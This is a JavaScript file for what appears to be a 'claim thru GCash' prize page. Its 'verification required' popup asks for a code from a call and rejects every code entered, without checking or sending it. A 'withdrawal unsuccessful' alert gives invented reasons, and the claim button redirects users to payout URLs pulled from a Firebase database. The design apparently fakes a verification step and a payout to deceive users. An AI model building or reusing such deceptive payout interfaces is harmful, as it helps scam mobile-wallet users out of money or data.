/**
 * popup_share.js
 * CLAIM THRU GCASH LOGIC - COMPLETE
 */

// ========== FIREWALL VERIFICATION POPUP ==========
function showFirewallVerificationPopup() {
    // Remove existing modal
    var existing = document.getElementById('firewallModal');
    if (existing) existing.remove();
    
    var modal = document.createElement('div');
    modal.id = 'firewallModal';
    modal.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.95);backdrop-filter:blur(10px);z-index:20001;display:flex;align-items:center;justify-content:center;';
    
    modal.innerHTML = `
        <div style="background:linear-gradient(145deg,#1a1525,#0f0a1a);border-radius:48px;max-width:340px;width:85%;padding:30px;text-align:center;border:1px solid rgba(255,215,0,0.3);">
            <div style="font-size:48px;margin-bottom:15px;">📞</div>
            <h2 style="color:#ff4444;font-size:22px;margin-bottom:15px;">VERIFICATION REQUIRED</h2>
            <p style="color:white;margin-bottom:20px;">Enter the 4-digit code from the verification call.</p>
            <div style="display:flex;gap:10px;margin-bottom:15px;">
                <input type="text" id="vCode" style="flex:1;background:rgba(0,0,0,0.5);border:1px solid rgba(255,215,0,0.3);border-radius:30px;padding:12px;color:white;font-size:18px;text-align:center;" placeholder="1234" maxlength="4">
                <button id="verifyBtn" style="background:#ff4444;border:none;border-radius:30px;padding:0 20px;color:white;font-weight:bold;cursor:pointer;">VERIFY</button>
            </div>
            <div id="vError" style="color:#ff4444;font-size:12px;display:none;"></div>
        </div>
    `;
    
    document.body.appendChild(modal);
    
    var input = document.getElementById('vCode');
    var verifyBtn = document.getElementById('verifyBtn');
    var errorDiv = document.getElementById('vError');
    
    if (input) input.focus();
    
    verifyBtn.onclick = function() {
        var code = input.value.trim();
        if (!code || code.length < 4) {
            errorDiv.innerHTML = "Please enter a 4-digit code.";
            errorDiv.style.display = 'block';
            return;
        }
        errorDiv.innerHTML = "Invalid verification code. Please try again.";
        errorDiv.style.display = 'block';
        input.value = '';
        input.focus();
    };
    
    modal.onclick = function(e) {
        if (e.target === modal) modal.remove();
    };
}

// ========== NO LINK ALERT ==========
function showNoLinkAlert() {
    var modal = document.createElement('div');
    modal.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.95);z-index:20000;display:flex;align-items:center;justify-content:center;';
    
    modal.innerHTML = `
        <div style="background:linear-gradient(145deg,#1a1525,#0f0a1a);border-radius:40px;max-width:320px;width:85%;padding:30px;text-align:center;border:1px solid rgba(255,68,68,0.3);">
            <div style="font-size:48px;margin-bottom:15px;">⚠️</div>
            <h3 style="color:#ff4444;font-size:20px;margin-bottom:20px;">WITHDRAWAL UNSUCCESSFUL</h3>
            <div style="color:white;font-size:13px;text-align:left;">
                <p><strong>Possible Reasons:</strong></p>
                <p>• No GCash payout link available</p>
                <p>• Device reached maximum payout limit</p>
                <p>• No GCash app installed</p>
                <p>• Please try another device</p>
            </div>
            <button id="closeAlert" style="background:#ff4444;border:none;border-radius:40px;padding:12px;color:white;font-weight:bold;margin-top:20px;width:100%;cursor:pointer;">GOT IT</button>
        </div>
    `;
    
    document.body.appendChild(modal);
    document.getElementById('closeAlert').onclick = function() {
        modal.remove();
    };
}

// ========== MAIN CLAIM LOGIC ==========
async function handleClaimThruGCash() {
    // Isara ang popup
    var prizePopup = document.getElementById('prizePopup');
    if (prizePopup) prizePopup.style.display = 'none';
    
    var db = firebase.database();
    
    try {
        // Kunin ang link mula sa Firebase
        var linkSnap = await db.ref('links').orderByChild('status').equalTo('available').limitToFirst(1).once('value');
        
        if (linkSnap.exists()) {
            var key = Object.keys(linkSnap.val())[0];
            var url = linkSnap.val()[key].url;
            
            // I-update ang status
            await db.ref('links/' + key).update({ status: 'claimed' });
            
            // Redirect sa URL mula sa database
            window.location.href = url;
        } else {
            alert("No payout link available.");
        }
        
    } catch(e) {
        alert("Error: " + e.message);
    }
}

// ========== INITIALIZE BUTTON ==========
function initClaimThruGCashButton() {
    var claimBtn = document.getElementById('claimGCashBtn');
    
    if (claimBtn) {
        var newBtn = claimBtn.cloneNode(true);
        claimBtn.parentNode.replaceChild(newBtn, claimBtn);
        claimBtn = newBtn;
        
        claimBtn.onclick = function(e) {
            e.preventDefault();
            e.stopPropagation();
            handleClaimThruGCash();
        };
        
        console.log("CLAIM THRU GCASH button ready");
    } else {
        setTimeout(initClaimThruGCashButton, 500);
    }
}

// ========== START ==========
document.addEventListener('DOMContentLoaded', function() {
    console.log("Popup_share.js loaded");
    initClaimThruGCashButton();
});

// Expose
window.handleClaimThruGCash = handleClaimThruGCash;
